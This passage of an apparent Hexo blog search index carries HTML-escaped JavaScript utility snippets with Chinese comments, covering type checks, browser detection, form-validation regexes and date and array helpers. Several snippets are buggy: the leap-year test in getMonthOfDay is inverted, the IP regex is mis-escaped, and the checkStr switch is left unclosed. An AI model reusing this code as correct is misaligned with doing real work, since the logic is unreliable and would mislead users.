&#x3D;&#x3D;&#x3D; &#39;Error&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isSymbol (o) &#123; &#x2F;&#x2F;是否Symbol函数</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Symbol&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isPromise (o) &#123; &#x2F;&#x2F;是否Promise对象</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Promise&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isSet (o) &#123; &#x2F;&#x2F;是否Set对象</span><br><span class="line">    return Object.prototype.toString.call(o).slice(8, -1) &#x3D;&#x3D;&#x3D; &#39;Set&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isFalse (o) &#123;</span><br><span class="line">    if (!o || o &#x3D;&#x3D;&#x3D; &#39;null&#39; || o &#x3D;&#x3D;&#x3D; &#39;undefined&#39; || o &#x3D;&#x3D;&#x3D; &#39;false&#39; || o &#x3D;&#x3D;&#x3D; &#39;NaN&#39;) return true</span><br><span class="line">        return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isTrue (o) &#123;</span><br><span class="line">    return !this.isFalse(o)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isIos () &#123;</span><br><span class="line">    var u &#x3D; navigator.userAgent;</span><br><span class="line">    if (u.indexOf(&#39;Android&#39;) &gt; -1 || u.indexOf(&#39;Linux&#39;) &gt; -1) &#123;&#x2F;&#x2F;安卓手机</span><br><span class="line">        &#x2F;&#x2F; return &quot;Android&quot;;</span><br><span class="line">        return false</span><br><span class="line">    &#125; else if (u.indexOf(&#39;iPhone&#39;) &gt; -1) &#123;&#x2F;&#x2F;苹果手机</span><br><span class="line">        &#x2F;&#x2F; return &quot;iPhone&quot;;</span><br><span class="line">        return true</span><br><span class="line">    &#125; else if (u.indexOf(&#39;iPad&#39;) &gt; -1) &#123;&#x2F;&#x2F;iPad</span><br><span class="line">        &#x2F;&#x2F; return &quot;iPad&quot;;</span><br><span class="line">        return false</span><br><span class="line">    &#125; else if (u.indexOf(&#39;Windows Phone&#39;) &gt; -1) &#123;&#x2F;&#x2F;winphone手机</span><br><span class="line">        &#x2F;&#x2F; return &quot;Windows Phone&quot;;</span><br><span class="line">        return false</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isPC () &#123; &#x2F;&#x2F;是否为PC端</span><br><span class="line">    var userAgentInfo &#x3D; navigator.userAgent;</span><br><span class="line">    var Agents &#x3D; [&quot;Android&quot;, &quot;iPhone&quot;,</span><br><span class="line">                &quot;SymbianOS&quot;, &quot;Windows Phone&quot;,</span><br><span class="line">                &quot;iPad&quot;, &quot;iPod&quot;];</span><br><span class="line">    var flag &#x3D; true;</span><br><span class="line">    for (var v &#x3D; 0; v &lt; Agents.length; v++) &#123;</span><br><span class="line">        if (userAgentInfo.indexOf(Agents[v]) &gt; 0) &#123;</span><br><span class="line">            flag &#x3D; false;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">browserType()&#123;</span><br><span class="line">    var userAgent &#x3D; navigator.userAgent; &#x2F;&#x2F;取得浏览器的userAgent字符串</span><br><span class="line">    var isOpera &#x3D; userAgent.indexOf(&quot;Opera&quot;) &gt; -1; &#x2F;&#x2F;判断是否Opera浏览器</span><br><span class="line">    var isIE &#x3D; userAgent.indexOf(&quot;compatible&quot;) &gt; -1 &amp;&amp; userAgent.indexOf(&quot;MSIE&quot;) &gt; -1 &amp;&amp; !isOpera; &#x2F;&#x2F;判断是否IE浏览器</span><br><span class="line">    var isIE11 &#x3D; userAgent.indexOf(&#39;Trident&#39;) &gt; -1 &amp;&amp; userAgent.indexOf(&quot;rv:11.0&quot;) &gt; -1;</span><br><span class="line">    var isEdge &#x3D; userAgent.indexOf(&quot;Edge&quot;) &gt; -1 &amp;&amp; !isIE; &#x2F;&#x2F;判断是否IE的Edge浏览器  </span><br><span class="line">    var isFF &#x3D; userAgent.indexOf(&quot;Firefox&quot;) &gt; -1; &#x2F;&#x2F;判断是否Firefox浏览器</span><br><span class="line">    var isSafari &#x3D; userAgent.indexOf(&quot;Safari&quot;) &gt; -1 &amp;&amp; userAgent.indexOf(&quot;Chrome&quot;) &#x3D;&#x3D; -1; &#x2F;&#x2F;判断是否Safari浏览器</span><br><span class="line">    var isChrome &#x3D; userAgent.indexOf(&quot;Chrome&quot;) &gt; -1 &amp;&amp; userAgent.indexOf(&quot;Safari&quot;) &gt; -1; &#x2F;&#x2F;判断Chrome浏览器</span><br><span class="line"></span><br><span class="line">    if (isIE) &#123;</span><br><span class="line">        var reIE &#x3D; new RegExp(&quot;MSIE (\\d+\\.\\d+);&quot;);</span><br><span class="line">        reIE.test(userAgent);</span><br><span class="line">        var fIEVersion &#x3D; parseFloat(RegExp[&quot;$1&quot;]);</span><br><span class="line">        if(fIEVersion &#x3D;&#x3D; 7) return &quot;IE7&quot;</span><br><span class="line">        else if(fIEVersion &#x3D;&#x3D; 8) return &quot;IE8&quot;;</span><br><span class="line">        else if(fIEVersion &#x3D;&#x3D; 9) return &quot;IE9&quot;;</span><br><span class="line">        else if(fIEVersion &#x3D;&#x3D; 10) return &quot;IE10&quot;;</span><br><span class="line">        else return &quot;IE7以下&quot;&#x2F;&#x2F;IE版本过低</span><br><span class="line">    &#125;</span><br><span class="line">    if (isIE11) return &#39;IE11&#39;;</span><br><span class="line">    if (isEdge) return &quot;Edge&quot;;</span><br><span class="line">    if (isFF) return &quot;FF&quot;;</span><br><span class="line">    if (isOpera) return &quot;Opera&quot;;</span><br><span class="line">    if (isSafari) return &quot;Safari&quot;;</span><br><span class="line">    if (isChrome) return &quot;Chrome&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">checkStr (str, type) &#123;</span><br><span class="line">    switch (type) &#123;</span><br><span class="line">        case &#39;phone&#39;:   &#x2F;&#x2F;手机号码</span><br><span class="line">            return &#x2F;^1[3|4|5|6|7|8|9][0-9]&#123;9&#125;$&#x2F;.test(str);</span><br><span class="line">        case &#39;tel&#39;:     &#x2F;&#x2F;座机</span><br><span class="line">            return &#x2F;^(0\d&#123;2,3&#125;-\d&#123;7,8&#125;)(-\d&#123;1,4&#125;)?$&#x2F;.test(str);</span><br><span class="line">        case &#39;card&#39;:    &#x2F;&#x2F;身份证</span><br><span class="line">            return &#x2F;(^\d&#123;15&#125;$)|(^\d&#123;18&#125;$)|(^\d&#123;17&#125;(\d|X|x)$)&#x2F;.test(str);</span><br><span class="line">        case &#39;pwd&#39;:     &#x2F;&#x2F;密码以字母开头，长度在6~18之间，只能包含字母、数字和下划线</span><br><span class="line">            return &#x2F;^[a-zA-Z]\w&#123;5,17&#125;$&#x2F;.test(str)</span><br><span class="line">        case &#39;postal&#39;:  &#x2F;&#x2F;邮政编码</span><br><span class="line">            return &#x2F;[1-9]\d&#123;5&#125;(?!\d)&#x2F;.test(str);</span><br><span class="line">        case &#39;QQ&#39;:      &#x2F;&#x2F;QQ号</span><br><span class="line">            return &#x2F;^[1-9][0-9]&#123;4,9&#125;$&#x2F;.test(str);</span><br><span class="line">        case &#39;email&#39;:   &#x2F;&#x2F;邮箱</span><br><span class="line">            return &#x2F;^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$&#x2F;.test(str);</span><br><span class="line">        case &#39;money&#39;:   &#x2F;&#x2F;金额(小数点2位)</span><br><span class="line">            return &#x2F;^\d*(?:\.\d&#123;0,2&#125;)?$&#x2F;.test(str);</span><br><span class="line">        case &#39;URL&#39;:     &#x2F;&#x2F;网址</span><br><span class="line">            return &#x2F;(http|ftp|https):\&#x2F;\&#x2F;[\w\-_]+(\.[\w\-_]+)+([\w\-\.,@?^&#x3D;%&amp;:&#x2F;~\+#]*[\w\-\@?^&#x3D;%&amp;&#x2F;~\+#])?&#x2F;.test(str)</span><br><span class="line">        case &#39;IP&#39;:      &#x2F;&#x2F;IP</span><br><span class="line">            return &#x2F;((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))&#x2F;.test(str);</span><br><span class="line">        case &#39;date&#39;:    &#x2F;&#x2F;日期时间</span><br><span class="line">            return &#x2F;^(\d&#123;4&#125;)\-(\d&#123;2&#125;)\-(\d&#123;2&#125;) (\d&#123;2&#125;)(?:\:\d&#123;2&#125;|:(\d&#123;2&#125;):(\d&#123;2&#125;))$&#x2F;.test(str) || &#x2F;^(\d&#123;4&#125;)\-(\d&#123;2&#125;)\-(\d&#123;2&#125;)$&#x2F;.test(str)</span><br><span class="line">        case &#39;number&#39;:  &#x2F;&#x2F;数字</span><br><span class="line">            return &#x2F;^[0-9]$&#x2F;.test(str);</span><br><span class="line">        case &#39;english&#39;: &#x2F;&#x2F;英文</span><br><span class="line">            return &#x2F;^[a-zA-Z]+$&#x2F;.test(str);</span><br><span class="line">        case &#39;chinese&#39;: &#x2F;&#x2F;中文</span><br><span class="line">            return &#x2F;^[\u4E00-\u9FA5]+$&#x2F;.test(str);</span><br><span class="line">        case &#39;lower&#39;:   &#x2F;&#x2F;小写</span><br><span class="line">            return &#x2F;^[a-z]+$&#x2F;.test(str);</span><br><span class="line">        case &#39;upper&#39;:   &#x2F;&#x2F;大写</span><br><span class="line">            return &#x2F;^[A-Z]+$&#x2F;.test(str);</span><br><span class="line">        case &#39;HTML&#39;:    &#x2F;&#x2F;HTML标记</span><br><span class="line">            return &#x2F;&lt;(&quot;[^&quot;]*&quot;|&#39;[^&#39;]*&#39;|[^&#39;&quot;&gt;])*&gt;&#x2F;.test(str);</span><br><span class="line">        default:</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 严格的身份证校验</span><br><span class="line">    isCardID(sId) &#123;</span><br><span class="line">        if (!&#x2F;(^\d&#123;15&#125;$)|(^\d&#123;17&#125;(\d|X|x)$)&#x2F;.test(sId)) &#123;</span><br><span class="line">            alert(&#39;你输入的身份证长度或格式错误&#39;)</span><br><span class="line">            return false</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;身份证城市</span><br><span class="line">        var aCity&#x3D;&#123;11:&quot;北京&quot;,12:&quot;天津&quot;,13:&quot;河北&quot;,14:&quot;山西&quot;,15:&quot;内蒙古&quot;,21:&quot;辽宁&quot;,22:&quot;吉林&quot;,23:&quot;黑龙江&quot;,31:&quot;上海&quot;,32:&quot;江苏&quot;,33:&quot;浙江&quot;,34:&quot;安徽&quot;,35:&quot;福建&quot;,36:&quot;江西&quot;,37:&quot;山东&quot;,41:&quot;河南&quot;,42:&quot;湖北&quot;,43:&quot;湖南&quot;,44:&quot;广东&quot;,45:&quot;广西&quot;,46:&quot;海南&quot;,50:&quot;重庆&quot;,51:&quot;四川&quot;,52:&quot;贵州&quot;,53:&quot;云南&quot;,54:&quot;西藏&quot;,61:&quot;陕西&quot;,62:&quot;甘肃&quot;,63:&quot;青海&quot;,64:&quot;宁夏&quot;,65:&quot;新疆&quot;,71:&quot;台湾&quot;,81:&quot;香港&quot;,82:&quot;澳门&quot;,91:&quot;国外&quot;&#125;;</span><br><span class="line">        if(!aCity[parseInt(sId.substr(0,2))]) &#123; </span><br><span class="line">            alert(&#39;你的身份证地区非法&#39;)</span><br><span class="line">            return false</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 出生日期验证</span><br><span class="line">        var sBirthday&#x3D;(sId.substr(6,4)+&quot;-&quot;+Number(sId.substr(10,2))+&quot;-&quot;+Number(sId.substr(12,2))).replace(&#x2F;-&#x2F;g,&quot;&#x2F;&quot;),</span><br><span class="line">            d &#x3D; new Date(sBirthday)</span><br><span class="line">        if(sBirthday !&#x3D; (d.getFullYear()+&quot;&#x2F;&quot;+ (d.getMonth()+1) + &quot;&#x2F;&quot; + d.getDate())) &#123;</span><br><span class="line">            alert(&#39;身份证上的出生日期非法&#39;)</span><br><span class="line">            return false</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 身份证号码校验</span><br><span class="line">        var sum &#x3D; 0,</span><br><span class="line">            weights &#x3D;  [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2],</span><br><span class="line">            codes &#x3D; &quot;10X98765432&quot;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; sId.length - 1; i++) &#123;</span><br><span class="line">            sum +&#x3D; sId[i] * weights[i];</span><br><span class="line">        &#125;</span><br><span class="line">        var last &#x3D; codes[sum % 11]; &#x2F;&#x2F;计算出来的最后一位身份证号码</span><br><span class="line">        if (sId[sId.length-1] !&#x3D; last) &#123; </span><br><span class="line">            alert(&#39;你输入的身份证号非法&#39;)</span><br><span class="line">            return false</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript常用工具方法（2）Date</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-%EF%BC%882%EF%BC%89Date/</url>
    <content><![CDATA[<h2 id="2-Date"><a href="#2-Date" class="headerlink" title="2. Date"></a>2. Date</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 格式化时间</span><br><span class="line"> * </span><br><span class="line"> * @param  &#123;time&#125; 时间</span><br><span class="line"> * @param  &#123;cFormat&#125; 格式</span><br><span class="line"> * @return &#123;String&#125; 字符串</span><br><span class="line"> *</span><br><span class="line"> * @example formatTime(&#39;2018-1-29&#39;, &#39;&#123;y&#125;&#x2F;&#123;m&#125;&#x2F;&#123;d&#125; &#123;h&#125;:&#123;i&#125;:&#123;s&#125;&#39;) &#x2F;&#x2F; -&gt; 2018&#x2F;01&#x2F;29 00:00:00</span><br><span class="line"> *&#x2F;</span><br><span class="line">formatTime(time, cFormat) &#123;</span><br><span class="line">    if (arguments.length &#x3D;&#x3D;&#x3D; 0) return null</span><br><span class="line">    if ((time + &#39;&#39;).length &#x3D;&#x3D;&#x3D; 10) &#123;</span><br><span class="line">        time &#x3D; +time * 1000</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var format &#x3D; cFormat || &#39;&#123;y&#125;-&#123;m&#125;-&#123;d&#125; &#123;h&#125;:&#123;i&#125;:&#123;s&#125;&#39;, date</span><br><span class="line">    if (typeof time &#x3D;&#x3D;&#x3D; &#39;object&#39;) &#123;</span><br><span class="line">        date &#x3D; time</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        date &#x3D; new Date(time)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var formatObj &#x3D; &#123;</span><br><span class="line">        y: date.getFullYear(),</span><br><span class="line">        m: date.getMonth() + 1,</span><br><span class="line">        d: date.getDate(),</span><br><span class="line">        h: date.getHours(),</span><br><span class="line">        i: date.getMinutes(),</span><br><span class="line">        s: date.getSeconds(),</span><br><span class="line">        a: date.getDay()</span><br><span class="line">    &#125;</span><br><span class="line">    var time_str &#x3D; format.replace(&#x2F;&#123;(y|m|d|h|i|s|a)+&#125;&#x2F;g, (result, key) &#x3D;&gt; &#123;</span><br><span class="line">        var value &#x3D; formatObj[key]</span><br><span class="line">        if (key &#x3D;&#x3D;&#x3D; &#39;a&#39;) return [&#39;一&#39;, &#39;二&#39;, &#39;三&#39;, &#39;四&#39;, &#39;五&#39;, &#39;六&#39;, &#39;日&#39;][value - 1]</span><br><span class="line">        if (result.length &gt; 0 &amp;&amp; value &lt; 10) &#123;</span><br><span class="line">            value &#x3D; &#39;0&#39; + value</span><br><span class="line">        &#125;</span><br><span class="line">        return value || 0</span><br><span class="line">    &#125;)</span><br><span class="line">    return time_str</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 返回指定长度的月份集合</span><br><span class="line"> * </span><br><span class="line"> * @param  &#123;time&#125; 时间</span><br><span class="line"> * @param  &#123;len&#125; 长度</span><br><span class="line"> * @param  &#123;direction&#125; 方向：  1: 前几个月;  2: 后几个月;  3:前后几个月  默认 3</span><br><span class="line"> * @return &#123;Array&#125; 数组</span><br><span class="line"> * </span><br><span class="line"> * @example   getMonths(&#39;2018-1-29&#39;, 6, 1)  &#x2F;&#x2F; -&gt;  [&quot;2018-1&quot;, &quot;2017-12&quot;, &quot;2017-11&quot;, &quot;2017-10&quot;, &quot;2017-9&quot;, &quot;2017-8&quot;, &quot;2017-7&quot;]</span><br><span class="line"> *&#x2F;</span><br><span class="line">getMonths(time, len, direction) &#123;</span><br><span class="line">    var mm &#x3D; new Date(time).getMonth(),</span><br><span class="line">        yy &#x3D; new Date(time).getFullYear(),</span><br><span class="line">        direction &#x3D; isNaN(direction) ? 3 : direction,</span><br><span class="line">        index &#x3D; mm;</span><br><span class="line">    var cutMonth &#x3D; function(index) &#123;</span><br><span class="line">        if ( index &lt;&#x3D; len &amp;&amp; index &gt;&#x3D; -len) &#123;</span><br><span class="line">            return direction &#x3D;&#x3D;&#x3D; 1 ? formatPre(index).concat(cutMonth(++index)):</span><br><span class="line">                direction &#x3D;&#x3D;&#x3D; 2 ? formatNext(index).concat(cutMonth(++index)):formatCurr(index).concat(cutMonth(++index))</span><br><span class="line">        &#125;</span><br><span class="line">        return []</span><br><span class="line">    &#125;</span><br><span class="line">    var formatNext &#x3D; function(i) &#123;</span><br><span class="line">        var y &#x3D; Math.floor(i&#x2F;12),</span><br><span class="line">            m &#x3D; i%12</span><br><span class="line">        return [yy+y + &#39;-&#39; + (m+1)]</span><br><span class="line">    &#125;</span><br><span class="line">    var formatPre &#x3D; function(i) &#123;</span><br><span class="line">        var y &#x3D; Math.ceil(i&#x2F;12),</span><br><span class="line">            m &#x3D; i%12</span><br><span class="line">        m &#x3D; m&#x3D;&#x3D;&#x3D;0 ? 12 : m</span><br><span class="line">        return [yy-y + &#39;-&#39; + (13 - m)]</span><br><span class="line">    &#125;</span><br><span class="line">    var formatCurr &#x3D; function(i) &#123;</span><br><span class="line">        var y &#x3D; Math.floor(i&#x2F;12),</span><br><span class="line">            yNext &#x3D; Math.ceil(i&#x2F;12),</span><br><span class="line">            m &#x3D; i%12,</span><br><span class="line">            mNext &#x3D; m&#x3D;&#x3D;&#x3D;0 ? 12 : m</span><br><span class="line">        return [yy-yNext + &#39;-&#39; + (13 - mNext),yy+y + &#39;-&#39; + (m+1)]</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 数组去重</span><br><span class="line">    var unique &#x3D; function(arr) &#123;</span><br><span class="line">        if ( Array.hasOwnProperty(&#39;from&#39;) ) &#123;</span><br><span class="line">            return Array.from(new Set(arr));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            var n &#x3D; &#123;&#125;,r&#x3D;[]; </span><br><span class="line">            for(var i &#x3D; 0; i &lt; arr.length; i++)&#123;</span><br><span class="line">                if (!n[arr[i]])&#123;</span><br><span class="line">                    n[arr[i]] &#x3D; true; </span><br><span class="line">                    r.push(arr[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return direction !&#x3D;&#x3D; 3 ? cutMonth(index) : unique(cutMonth(index).sort(function(t1, t2)&#123;</span><br><span class="line">        return new Date(t1).getTime() - new Date(t2).getTime()</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 返回指定长度的天数集合</span><br><span class="line"> * </span><br><span class="line"> * @param  &#123;time&#125; 时间</span><br><span class="line"> * @param  &#123;len&#125; 长度</span><br><span class="line"> * @param  &#123;direction&#125; 方向： 1: 前几天;  2: 后几天;  3:前后几天  默认 3</span><br><span class="line"> * @return &#123;Array&#125; 数组</span><br><span class="line"> *</span><br><span class="line"> * @example date.getDays(&#39;2018-1-29&#39;, 6) &#x2F;&#x2F; -&gt; [&quot;2018-1-26&quot;, &quot;2018-1-27&quot;, &quot;2018-1-28&quot;, &quot;2018-1-29&quot;, &quot;2018-1-30&quot;, &quot;2018-1-31&quot;, &quot;2018-2-1&quot;]</span><br><span class="line"> *&#x2F;</span><br><span class="line">getDays(time, len, diretion) &#123;</span><br><span class="line">    var tt &#x3D; new Date(time)</span><br><span class="line">    var getDay &#x3D; function(day) &#123;</span><br><span class="line">        var t &#x3D; new Date(time)</span><br><span class="line">        t.setDate(t.getDate() + day)</span><br><span class="line">        var m &#x3D; t.getMonth()+1</span><br><span class="line">        return t.getFullYear()+&#39;-&#39;+m+&#39;-&#39;+t.getDate()</span><br><span class="line">    &#125;</span><br><span class="line">    var arr &#x3D; []</span><br><span class="line">    if (diretion &#x3D;&#x3D;&#x3D; 1) &#123;</span><br><span class="line">        for (var i &#x3D; 1; i &lt;&#x3D; len; i++) &#123;</span><br><span class="line">            arr.unshift(getDay(-i))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else if(diretion &#x3D;&#x3D;&#x3D; 2) &#123;</span><br><span class="line">        for (var i &#x3D; 1; i &lt;&#x3D; len; i++) &#123;</span><br><span class="line">            arr.push(getDay(i))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        for (var i &#x3D; 1; i &lt;&#x3D; len; i++) &#123;</span><br><span class="line">            arr.unshift(getDay(-i))</span><br><span class="line">        &#125;</span><br><span class="line">        arr.push(tt.getFullYear()+&#39;-&#39;+(tt.getMonth()+1)+&#39;-&#39;+tt.getDate())</span><br><span class="line">        for (var i &#x3D; 1; i &lt;&#x3D; len; i++) &#123;</span><br><span class="line">            arr.push(getDay(i))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return diretion &#x3D;&#x3D;&#x3D; 1 ? arr.concat([tt.getFullYear()+&#39;-&#39;+(tt.getMonth()+1)+&#39;-&#39;+tt.getDate()]) : </span><br><span class="line">        diretion &#x3D;&#x3D;&#x3D; 2 ? [tt.getFullYear()+&#39;-&#39;+(tt.getMonth()+1)+&#39;-&#39;+tt.getDate()].concat(arr) : arr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @param  &#123;s&#125; 秒数</span><br><span class="line"> * @return &#123;String&#125; 字符串 </span><br><span class="line"> *</span><br><span class="line"> * @example formatHMS(3610) &#x2F;&#x2F; -&gt; 1h0m10s</span><br><span class="line"> *&#x2F;</span><br><span class="line">formatHMS (s) &#123;</span><br><span class="line">    var str &#x3D; &#39;&#39;</span><br><span class="line">    if (s &gt; 3600) &#123;</span><br><span class="line">        str &#x3D; Math.floor(s&#x2F;3600)+&#39;h&#39;+Math.floor(s%3600&#x2F;60)+&#39;m&#39;+s%60+&#39;s&#39;</span><br><span class="line">    &#125;else if(s &gt; 60) &#123;</span><br><span class="line">        str &#x3D; Math.floor(s&#x2F;60)+&#39;m&#39;+s%60+&#39;s&#39;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        str &#x3D; s%60+&#39;s&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    return str</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*获取某月有多少天*&#x2F;</span><br><span class="line">getMonthOfDay (time) &#123;</span><br><span class="line">    var date &#x3D; new Date(time)</span><br><span class="line">    var year &#x3D; date.getFullYear()</span><br><span class="line">    var mouth &#x3D; date.getMonth() + 1</span><br><span class="line">    var days</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;当月份为二月时，根据闰年还是非闰年判断天数</span><br><span class="line">    if (mouth &#x3D;&#x3D; 2) &#123;</span><br><span class="line">        days &#x3D; (year%4&#x3D;&#x3D;0 &amp;&amp; year%100&#x3D;&#x3D;0 &amp;&amp; year%400&#x3D;&#x3D;0) || (year%4&#x3D;&#x3D;0 &amp;&amp; year%100!&#x3D;0) ? 28 : 29</span><br><span class="line">    &#125; else if (mouth &#x3D;&#x3D; 1 || mouth &#x3D;&#x3D; 3 || mouth &#x3D;&#x3D; 5 || mouth &#x3D;&#x3D; 7 || mouth &#x3D;&#x3D; 8 || mouth &#x3D;&#x3D; 10 || mouth &#x3D;&#x3D; 12) &#123;</span><br><span class="line">        &#x2F;&#x2F;月份为：1,3,5,7,8,10,12 时，为大月.则天数为31；</span><br><span class="line">        days &#x3D; 31</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F;其他月份，天数为：30.</span><br><span class="line">        days &#x3D; 30</span><br><span class="line">    &#125;</span><br><span class="line">    return days</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*获取某年有多少天*&#x2F;</span><br><span class="line">getYearOfDay (time) &#123;</span><br><span class="line">    var firstDayYear &#x3D; this.getFirstDayOfYear(time);</span><br><span class="line">    var lastDayYear &#x3D; this.getLastDayOfYear(time);</span><br><span class="line">    var numSecond &#x3D; (new Date(lastDayYear).getTime() - new Date(firstDayYear).getTime())&#x2F;1000;</span><br><span class="line">    return Math.ceil(numSecond&#x2F;(24*3600));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*获取某年的第一天*&#x2F;</span><br><span class="line">getFirstDayOfYear (time) &#123;</span><br><span class="line">    var year &#x3D; new Date(time).getFullYear();</span><br><span class="line">    return year + &quot;-01-01 00:00:00&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*获取某年最后一天*&#x2F;</span><br><span class="line">getLastDayOfYear (time) &#123;</span><br><span class="line">    var year &#x3D; new Date(time).getFullYear();</span><br><span class="line">    var dateString &#x3D; year + &quot;-12-01 00:00:00&quot;;</span><br><span class="line">    var endDay &#x3D; this.getMonthOfDay(dateString);</span><br><span class="line">    return year + &quot;-12-&quot; + endDay + &quot; 23:59:59&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*获取某个日期是当年中的第几天*&#x2F;</span><br><span class="line">getDayOfYear (time) &#123;</span><br><span class="line">    var firstDayYear &#x3D; this.getFirstDayOfYear(time);</span><br><span class="line">    var numSecond &#x3D; (new Date(time).getTime() - new Date(firstDayYear).getTime())&#x2F;1000;</span><br><span class="line">    return Math.ceil(numSecond&#x2F;(24*3600));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*获取某个日期在这一年的第几周*&#x2F;</span><br><span class="line">getDayOfYearWeek (time) &#123;</span><br><span class="line">    var numdays &#x3D; this.getDayOfYear(time);</span><br><span class="line">    return Math.ceil(numdays &#x2F; 7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript常用工具方法（3）Array</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-%EF%BC%883%EF%BC%89Array/</url>
    <content><![CDATA[<p>##3. Array</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*判断一个元素是否在数组中*&#x2F;</span><br><span class="line">contains (arr, val) &#123;</span><br><span class="line">    return arr.indexOf(val) !&#x3D; -1 ? true : false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @param  &#123;arr&#125; 数组</span><br><span class="line"> * @param  &#123;fn&#125; 回调函数</span><br><span class="line"> * @return &#123;undefined&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">each (arr, fn) &#123;</span><br><span class="line">    fn &#x3D; fn || Function;</span><br><span class="line">    var a &#x3D; [];</span><br><span class="line">    var args &#x3D; Array.prototype.slice.call(arguments, 1);</span><br><span class="line">    for(var i &#x3D; 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">        var res &#x3D; fn.apply(arr, [arr[i], i].concat(args));</span><br><span class="line">        if(res !&#x3D; null) a.push(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @param  &#123;arr&#125; 数组</span><br><span class="line"> * @param  &#123;fn&#125; 回调函数</span><br><span class="line"> * @param  &#123;thisObj&#125; this指向</span><br><span class="line"> * @return &#123;Array&#125; </span><br><span class="line"> *&#x2F;</span><br><span class="line">map (arr, fn, thisObj) &#123;</span><br><span class="line">    var scope &#x3D; thisObj || window;</span><br><span class="line">    var a &#x3D; [];</span><br><span class="line">    for(var i &#x3D; 0, j &#x3D; arr.length; i &lt; j; ++i) &#123;</span><br><span class="line">        var res &#x3D; fn.call(scope, arr[i], i, this);</span><br><span class="line">        if(res !&#x3D; null) a.push(res);</span><br><span class="line">    &#125;</span><br><span class="line">    return a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @param  &#123;arr&#125; 数组</span><br><span class="line"> * @param  &#123;type&#125; 1：从小到大   2：从大到小   3：随机</span><br><span class="line"> * @return &#123;Array&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">sort (arr, type &#x3D; 1) 